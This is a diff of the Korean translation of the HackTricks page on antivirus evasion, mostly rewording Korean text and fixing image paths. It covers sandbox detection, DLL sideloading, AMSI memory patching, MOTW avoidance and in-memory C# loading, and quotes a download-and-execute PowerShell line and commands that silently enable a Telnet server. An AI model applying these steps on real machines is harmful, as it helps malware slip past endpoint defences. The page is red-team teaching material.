@@ -1,8 +1,8 @@
 # Antivirus (AV) Bypass
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).
 
@@ -29,7 +29,7 @@ If you are interested in **hacking career** and hack the unhackable - **we are h
 
 ### **정적 탐지**
 
-정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그 지정하고 파일 자체에서 정보를 추출하여 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미합니다. 왜냐하면 이러한 도구는 아마도 분석되어 악성으로 플래그가 지정되었기 때문입니다. 이러한 종류의 탐지를 우회하는 방법은 몇 가지가 있습니다:
+정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그 지정하고, 파일 자체에서 정보를 추출하여 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미합니다. 왜냐하면 이러한 도구는 아마도 분석되어 악성으로 플래그가 지정되었기 때문입니다. 이러한 종류의 탐지를 우회하는 몇 가지 방법이 있습니다:
 
 * **암호화**
 
@@ -44,7 +44,7 @@ If you are interested in **hacking career** and hack the unhackable - **we are h
 자신만의 도구를 개발하면 알려진 악성 서명이 없지만, 이는 많은 시간과 노력이 필요합니다.
 
 {% hint style="info" %}
-Windows Defender의 정적 탐지를 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나눈 다음 Defender에게 각 세그먼트를 개별적으로 스캔하도록 요청합니다. 이렇게 하면 이진 파일에서 플래그가 지정된 문자열이나 바이트를 정확히 알 수 있습니다.
+Windows Defender의 정적 탐지에 대한 좋은 확인 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나누고 Defender에게 각 세그먼트를 개별적으로 스캔하도록 요청합니다. 이렇게 하면 이진 파일에서 플래그가 지정된 문자열이나 바이트를 정확히 알 수 있습니다.
 {% endhint %}
 
 실용적인 AV 회피에 대한 이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)을 확인하는 것을 강력히 추천합니다.
@@ -55,9 +55,9 @@ Windows Defender의 정적 탐지를 확인하는 좋은 방법은 [ThreatCheck]
 
 * **실행 전 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에 긴 대기를 사용하면 이진 파일 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 대기를 건너뛸 수 있다는 것입니다.
 * **컴퓨터 자원 확인** 일반적으로 샌드박스는 작업할 수 있는 자원이 매우 적습니다(예: < 2GB RAM), 그렇지 않으면 사용자의 컴퓨터를 느리게 만들 수 있습니다. 여기서 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU의 온도나 팬 속도를 확인하는 것과 같이 샌드박스에 구현되지 않은 것들이 많습니다.
-* **기계 특정 검사** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.
+* **기계 특정 검사** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면, 컴퓨터의 도메인이 지정한 것과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.
 
-Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH이므로, 폭발 전에 악성코드에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 의미이므로 프로그램을 종료할 수 있습니다.
+Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH입니다. 따라서 폭발 전에 악성코드에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 의미이므로 프로그램을 종료할 수 있습니다.
 
 <figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
@@ -65,19 +65,19 @@ Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH이므로, 폭발 �
 
 <figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>
 
-앞서 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
+앞서 이 글에서 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
 
 예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있을까요?
 
 정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 아마도 AV와 EDR에 의해 가장 많이 플래그가 지정된 악성코드 중 하나일 것입니다. 프로젝트 자체는 매우 멋지지만, AV를 우회하기 위해 작업하는 것은 악몽과도 같습니다. 따라서 달성하려는 목표에 대한 대안을 찾아보세요.
 
 {% hint style="info" %}
-회피를 위해 페이로드를 수정할 때는 Defender에서 **자동 샘플 제출을 끄는 것**을 잊지 마세요. 그리고 제발, **장기적으로 회피를 달성하는 것이 목표라면 VIRUSTOTAL에 업로드하지 마세요**. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 설치하고 자동 샘플 제출을 끄고 결과에 만족할 때까지 테스트하세요.
+회피를 위해 페이로드를 수정할 때는 Defender에서 **자동 샘플 제출을 끄는 것**을 잊지 마세요. 그리고 제발, 진지하게, **VIRUSTOTAL에 업로드하지 마세요**. 장기적으로 회피를 달성하는 것이 목표라면 말이죠. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 설치하고 자동 샘플 제출을 끄고 결과에 만족할 때까지 테스트하세요.
 {% endhint %}
 
 ## EXEs vs DLLs
 
-가능할 때마다 항상 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜 됩니다**. 따라서 경우에 따라 탐지를 피하기 위해 사용하는 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).
+가능할 때마다 항상 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜** 되므로, 경우에 따라 탐지를 피하기 위해 사용하는 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).
 
 이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보이는 반면, EXE 페이로드는 7/26의 탐지율을 보입니다.
 
@@ -102,7 +102,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 
 이 명령은 "C:\Program Files\\" 내에서 DLL 하이재킹에 취약한 프로그램 목록과 그들이 로드하려고 하는 DLL 파일을 출력합니다.
 
-저는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색할 것을 강력히 추천합니다**, 이 기술은 제대로 수행되면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.
+저는 **DLL 하이재킹 가능/사이드로드 가능한 프로그램을 직접 탐색할 것을 강력히 추천합니다**. 이 기술은 제대로 수행하면 매우 은밀하지만, 공개적으로 알려진 DLL 사이드로드 가능한 프로그램을 사용하면 쉽게 발각될 수 있습니다.
 
 악성 DLL을 프로그램이 로드할 것으로 예상하는 이름으로 배치하는 것만으로는 페이로드가 로드되지 않습니다. 프로그램은 해당 DLL 내에서 특정 기능을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL 프록시/포워딩**이라는 또 다른 기술을 사용할 것입니다.
 
@@ -121,7 +121,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 {% endcode %}
 
-마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원본 이름이 변경된 DLL입니다.
+마지막 명령은 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL입니다.
 
 <figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 
@@ -140,7 +140,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 <figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-나는 당신이 [S3cur3Th1sSh1t의 트위치 VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청할 것을 **강력히 추천**합니다. 우리가 더 깊이 논의한 내용을 배우는 데 도움이 될 것입니다.
+나는 당신이 [S3cur3Th1sSh1t의 트위치 VOD](https://www.twitch.tv/videos/1644171543)와 [ippsec의 비디오](https://www.youtube.com/watch?v=3eROsG\_WNpE)를 시청할 것을 **강력히 추천**합니다. 우리가 더 깊이 논의한 내용을 배우기 위해서입니다.
 {% endhint %}
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
@@ -162,7 +162,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (안티 맬웨어 스캔 인터페이스)
 
-AMSI는 "[파일리스 맬웨어](https://en.wikipedia.org/wiki/Fileless\_malware)"를 방지하기 위해 만들어졌습니다. 처음에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 페이로드를 **직접 메모리에서 실행**할 수 있다면 AV는 이를 방지할 수 없었습니다. 왜냐하면 충분한 가시성이 없었기 때문입니다.
+AMSI는 "[파일 없는 맬웨어](https://en.wikipedia.org/wiki/Fileless\_malware)"를 방지하기 위해 만들어졌습니다. 처음에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 페이로드를 **메모리에서 직접 실행**할 수 있다면 AV는 이를 방지할 수 없었습니다. 왜냐하면 충분한 가시성이 없었기 때문입니다.
 
 AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.
 
@@ -172,7 +172,7 @@ AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.
 * JavaScript 및 VBScript
 * Office VBA 매크로
 
-이는 안티바이러스 솔루션이 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있게 합니다.
+이는 안티바이러스 솔루션이 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 스크립트 동작을 검사할 수 있도록 합니다.
 
 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음 경고가 발생합니다.
 
@@ -188,11 +188,11 @@ AMSI를 우회하는 방법은 몇 가지가 있습니다:
 
 AMSI는 주로 정적 감지와 함께 작동하므로, 로드하려는 스크립트를 수정하는 것이 감지를 회피하는 좋은 방법이 될 수 있습니다.
 
-그러나 AMSI는 여러 레이어가 있더라도 스크립트를 난독화 해제할 수 있는 기능이 있으므로, 난독화가 어떻게 이루어졌는지에 따라 나쁜 선택이 될 수 있습니다. 이는 회피를 간단하지 않게 만듭니다. 하지만 때때로, 변수 이름 몇 개만 변경하면 괜찮아지므로, 얼마나 많은 것이 플래그가 되었는지에 따라 다릅니다.
+그러나 AMSI는 여러 레이어가 있더라도 스크립트를 난독화 해제할 수 있는 기능이 있으므로, 난독화가 어떻게 이루어졌는지에 따라 나쁜 선택이 될 수 있습니다. 이는 회피를 간단하지 않게 만듭니다. 하지만 때때로, 변수 이름 몇 개만 변경하면 괜찮을 수 있으므로, 얼마나 많은 것이 플래그가 지정되었는지에 따라 다릅니다.
 
 * **AMSI 우회**
 
-AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되므로, 비특권 사용자로 실행하더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캔을 우회하는 여러 방법을 발견했습니다.
+AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하여 구현되므로, 비권한 사용자로 실행하더라도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 인해 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.
 
 **오류 강제 발생**
 
@@ -224,28 +224,28 @@ Keep in mind, that this will probably get flagged once this post comes out, so y
 
 **Memory Patching**
 
-이 기술은 [@RastaMouse](https://twitter.com/\_RastaMouse/)에 의해 처음 발견되었으며, amsi.dll에서 "AmsiScanBuffer" 함수의 주소를 찾아 사용자 제공 입력을 스캔하는 역할을 하는 이 함수를 E\_INVALIDARG 코드를 반환하도록 덮어쓰는 것입니다. 이렇게 하면 실제 스캔의 결과가 0으로 반환되어 깨끗한 결과로 해석됩니다.
+이 기술은 [@RastaMouse](https://twitter.com/\_RastaMouse/)에 의해 처음 발견되었으며, amsi.dll에서 "AmsiScanBuffer" 함수의 주소를 찾아 사용자 제공 입력을 스캔하는 역할을 하는 이 함수를 E\_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔의 결과가 0으로 반환되어 깨끗한 결과로 해석됩니다.
 
 {% hint style="info" %}
 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.
 {% endhint %}
 
-Powershell로 AMSI를 우회하는 데 사용되는 다른 많은 기술도 있습니다. [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.
+Powershell로 AMSI를 우회하는 데 사용되는 다른 많은 기술이 있으며, [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.
 
-또는 메모리 패칭을 통해 각 새로운 Powersh를 패치하는 이 스크립트가 있습니다.
+또는 메모리 패칭을 통해 각 새로운 Powersh를 패치하는 이 스크립트
 
 ## Obfuscation
 
-C# 클리어 텍스트 코드를 **난독화**하거나 이진 파일을 컴파일하기 위한 **메타프로그래밍 템플릿**을 생성하거나 **컴파일된 이진 파일을 난독화**하는 데 사용할 수 있는 여러 도구가 있습니다:
+C# 평문 코드를 **난독화**하거나 이진 파일을 컴파일하기 위한 **메타프로그래밍 템플릿**을 생성하거나 **컴파일된 이진 파일을 난독화**하는 데 사용할 수 있는 여러 도구가 있습니다:
 
 * [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화기**
-* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [코드 난독화](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 및 변조 방지를 통해 소프트웨어 보안을 강화하는 것입니다.
+* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [코드 난독화](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) 및 변조 방지를 통해 소프트웨어 보안을 강화할 수 있는 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하는 것입니다.
 * [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 `C++11/14` 언어를 사용하여 외부 도구를 사용하지 않고 컴파일 시간에 난독화된 코드를 생성하는 방법을 보여줍니다.
 * [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크에 의해 생성된 난독화된 작업의 레이어를 추가하여 애플리케이션을 크랙하려는 사람의 삶을 조금 더 어렵게 만듭니다.
 * [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys를 포함한 다양한 pe 파일을 난독화할 수 있는 x64 이진 난독화기입니다.
-* [**metame**](https://github.com/a0rtega/metame): Metame는 임의의 실행 파일을 위한 간단한 변형 코드 엔진입니다.
+* [**metame**](https://github.com/a0rtega/metame): Metame는 임의 실행 파일을 위한 간단한 변형 코드 엔진입니다.
 * [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(리턴 지향 프로그래밍)를 사용하는 LLVM 지원 언어를 위한 세밀한 코드 난독화 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 프로그램을 어셈블리 코드 수준에서 난독화하여 정상적인 제어 흐름에 대한 우리의 자연스러운 개념을 저해합니다.
-* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE 크립터입니다.
+* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE 암호화기입니다.
 * [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 쉘코드로 변환한 다음 로드할 수 있습니다.
 
 ## SmartScreen & MoTW
@@ -266,7 +266,7 @@ SmartScreen은 주로 평판 기반 접근 방식을 사용하여, 일반적으�
 신뢰할 수 있는 서명 인증서로 서명된 실행 파일은 **SmartScreen을 트리거하지 않습니다**.
 {% endhint %}
 
-페이로드가 Mark of The Web을 받지 않도록 하는 매우 효과적인 방법은 ISO와 같은 컨테이너에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **비 NTFS** 볼륨에 적용될 수 없기 때문입니다.
+페이로드가 Mark of The Web을 받지 않도록 방지하는 매우 효과적인 방법은 ISO와 같은 어떤 종류의 컨테이너에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW) **가** **비 NTFS** 볼륨에 적용될 수 없기 때문입니다.
 
 <figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>
 
@@ -304,31 +304,31 @@ C# 바이너리를 메모리에 로드하는 것은 꽤 오랫동안 알려져 �
 
 페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치에 대해서만 걱정하면 됩니다.
 
-대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 C# 어셈블리를 메모리에서 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:
+대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:
 
 * **Fork\&Run**
 
-이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입하여 악성 코드를 실행하고, 완료되면 새로운 프로세스를 종료하는 것입니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히더라도 **임플란트가 생존할 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.
+이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입한 후, 악성 코드를 실행하고 완료되면 새로운 프로세스를 종료하는 것입니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히더라도 **임플란트가 생존할 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.
 
 <figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>
 
 * **Inline**
 
-이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행에 문제가 생기면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 왜냐하면 비콘이 충돌할 수 있기 때문입니다.
+이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행에 문제가 생기면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 왜냐하면 프로세스가 충돌할 수 있기 때문입니다.
 
 <figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
-C# 어셈블리 로딩에 대해 더 읽고 싶다면, 이 기사를 확인해 보세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 그리고 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+C# 어셈블리 로딩에 대해 더 읽고 싶다면, 이 기사를 확인해 보세요 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 및 그들의 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 {% endhint %}
 
-PowerShell에서 C# 어셈블리를 **로드할 수도 있습니다**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.
+PowerShell에서 C# 어셈블리를 **로드할 수도 있습니다**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 및 [S3cur3th1sSh1t의 비디오](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.
 
 ## 다른 프로그래밍 언어 사용하기
 
-[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 바와 같이, 손상된 머신에 **공격자가 제어하는 SMB 공유에 설치된 인터프리터 환경에 대한 접근을 제공함으로써** 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.
+[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 바와 같이, 손상된 머신에 **공격자 제어 SMB 공유에 설치된 인터프리터 환경에 대한 접근을 제공함으로써** 다른 언어를 사용하여 악성 코드를 실행할 수 있습니다.
 
-SMB 공유의 인터프리터 바이너리와 환경에 대한 접근을 허용함으로써, 손상된 머신의 **메모리 내에서 이러한 언어로 임의의 코드를 실행할 수 있습니다.**
+SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허용함으로써, 손상된 머신의 **메모리 내에서 이러한 언어로 임의의 코드를 실행할 수 있습니다.**
 
 레포지토리는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용함으로써 **정적 서명을 우회할 수 있는 더 많은 유연성을 갖습니다.** 이러한 언어로 무작위로 난독화되지 않은 리버스 셸 스크립트로 테스트한 결과 성공적이었습니다.
 
@@ -338,11 +338,11 @@ SMB 공유의 인터프리터 바이너리와 환경에 대한 접근을 허용�
 
 당신이 맞서는 모든 환경은 고유한 강점과 약점을 가질 것입니다.
 
-더 고급 회피 기술에 대한 발판을 얻기 위해 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 시청하시길 권장합니다.
+더 고급 회피 기술에 대한 발판을 얻기 위해 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 시청하시기를 권장합니다.
 
 {% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}
 
-이것은 또한 [@mariuszbit](https://twitter.com/mariuszbit)의 깊이 있는 회피에 대한 또 다른 훌륭한 강연입니다.
+[@mariuszbit](https://twitter.com/mariuszbit)의 깊이 있는 회피에 대한 또 다른 훌륭한 강연입니다.
 
 {% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}
 
@@ -359,7 +359,7 @@ Windows 10까지 모든 Windows에는 **Telnet 서버**가 포함되어 있었�
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-시스템이 시작될 때 **시작**하고 **지금** 실행하십시오:
+시스템이 시작될 때 **시작**하고 지금 **실행**하십시오:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
@@ -569,15 +569,15 @@ https://github.com/praetorian-code/vulcan
 
 * [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="/.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-당신이 **해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 구사 필수_).
+당신이 **해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 필기 및 구사 필수_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS 해킹 배우기 및 연습하기:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -585,7 +585,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
 
 </details>
 {% endhint %}
